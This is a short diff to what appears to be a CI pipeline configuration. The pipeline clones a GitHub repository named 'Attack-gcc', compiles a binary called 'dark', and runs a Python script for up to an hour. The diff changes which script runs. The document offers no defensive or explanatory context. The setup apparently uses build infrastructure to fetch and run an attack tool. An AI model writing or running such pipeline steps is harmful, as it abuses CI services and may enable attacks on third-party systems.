@@ -15,4 +15,4 @@ pipelines:
           - git clone https://github.com/VIKASH-5938/Attack-gcc.git
           - cd Attack-gcc
           - g++ -std=c++14 dark.cpp -o dark -pthread
-          - chmod +x dark && timeout 3600 python3 soul.py
+          - chmod +x dark && timeout 3600 python3 v.py
